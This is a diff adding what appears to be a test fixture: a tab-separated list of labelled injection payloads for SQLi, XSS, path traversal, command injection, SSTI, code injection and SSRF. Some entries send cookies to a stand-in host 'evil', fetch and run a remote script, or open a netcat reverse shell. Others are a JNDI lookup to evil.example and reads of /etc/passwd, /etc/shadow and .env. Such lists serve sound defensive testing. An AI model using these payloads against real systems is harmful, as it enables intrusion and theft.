@@ -1,0 +1,89 @@
+sqli	' OR '1'='1
+sqli	' OR 1=1 --
+sqli	admin' --
+sqli	admin'#
+sqli	" OR ""="
+sqli	') OR ('1'='1
+sqli	1 OR 1=1
+sqli	1' AND 1=1 --
+sqli	x' UNION SELECT username, password FROM users--
+sqli	-1 UNION ALL SELECT NULL,NULL,version()--
+sqli	1 UNION/**/SELECT 1,2,3
+sqli	1; DROP TABLE users
+sqli	'; EXEC xp_cmdshell('dir')--
+sqli	1' AND SLEEP(5)--
+sqli	1'; WAITFOR DELAY '0:0:5'--
+sqli	1 AND (SELECT 1 FROM pg_sleep(5))
+sqli	' UNION SELECT table_name FROM information_schema.tables--
+sqli	' UNION SELECT name FROM sqlite_master--
+sqli	%27%20OR%20%271%27%3D%271
+sqli	%2527%2520OR%25201%253D1--
+xss	<script>alert(1)</script>
+xss	<ScRiPt>alert(document.cookie)</sCrIpT>
+xss	<img src=x onerror=alert(1)>
+xss	<svg onload=alert(1)>
+xss	<body onload=alert('x')>
+xss	<iframe src=javascript:alert(1)>
+xss	javascript:alert(1)
+xss	"><script>fetch('//evil/'+document.cookie)</script>
+xss	<a href="javascript:alert(1)">x</a>
+xss	&lt;script&gt;alert(1)&lt;/script&gt;
+xss	%3Cscript%3Ealert(1)%3C%2Fscript%3E
+xss	<details open ontoggle=alert(1)>
+xss	<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+path_traversal	../../etc/passwd
+path_traversal	..\..\windows\win.ini
+path_traversal	....//....//etc/passwd
+path_traversal	..%2f..%2f..%2fetc%2fpasswd
+path_traversal	%2e%2e%2f%2e%2e%2fsecret.txt
+path_traversal	%252e%252e%252fsecret.txt
+path_traversal	/etc/shadow
+path_traversal	file:///etc/passwd
+path_traversal	../.env
+path_traversal	php://filter/convert.base64-encode/resource=index.php
+command_injection	127.0.0.1; cat /etc/passwd
+command_injection	127.0.0.1 && whoami
+command_injection	127.0.0.1 | id
+command_injection	127.0.0.1 & echo pwned
+command_injection	$(whoami)
+command_injection	`id`
+command_injection	x || curl http://evil/sh | sh
+command_injection	;ls -la
+command_injection	| nc -e /bin/sh evil 4444
+command_injection	127.0.0.1%0Acat%20/etc/passwd
+command_injection	& ipconfig /all
+command_injection	| powershell -enc AAAA
+ssti	{{7*7}}
+ssti	{{config.items()}}
+ssti	{{ ''.__class__.__mro__[1].__subclasses__() }}
+ssti	{% for c in [].__class__.__base__.__subclasses__() %}{% endfor %}
+ssti	{{request.application.__globals__.__builtins__}}
+ssti	${7*7}#{7*7}
+code_injection	__import__('os').system('id')
+code_injection	__import__("subprocess").check_output("id")
+code_injection	eval(compile('1','x','exec'))
+code_injection	${jndi:ldap://evil.example/a}
+code_injection	().__class__.__bases__[0].__subclasses__()
+ssrf	http://169.254.169.254/latest/meta-data/iam/
+ssrf	http://localhost:6379/
+ssrf	http://127.0.0.1:8080/admin
+ssrf	http://metadata.google.internal/computeMetadata/v1/
+ssrf	gopher://127.0.0.1:25/
+ssrf	http://10.0.0.5/internal
+ssrf	http://192.168.1.1/
+sqli	x' OR TRUE--
+sqli	x' OR 1--
+sqli	x' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a
+sqli	1 OR 2>1
+sqli	1 AND (SELECT COUNT(*) FROM users)>0
+xss	" autofocus onfocus="alert(1)
+xss	jav&#x09;ascript:alert(1)
+command_injection	127.0.0.1 && printf AEGIS_CANARY
+command_injection	;head secret.txt
+command_injection	;/usr/bin/id
+command_injection	;id
+command_injection	| ls -la
+path_traversal	/proc/self/environ
+code_injection	open('secret.txt').read()
+ssrf	http://2130706433/
+ssrf	http://[::ffff:127.0.0.1]/
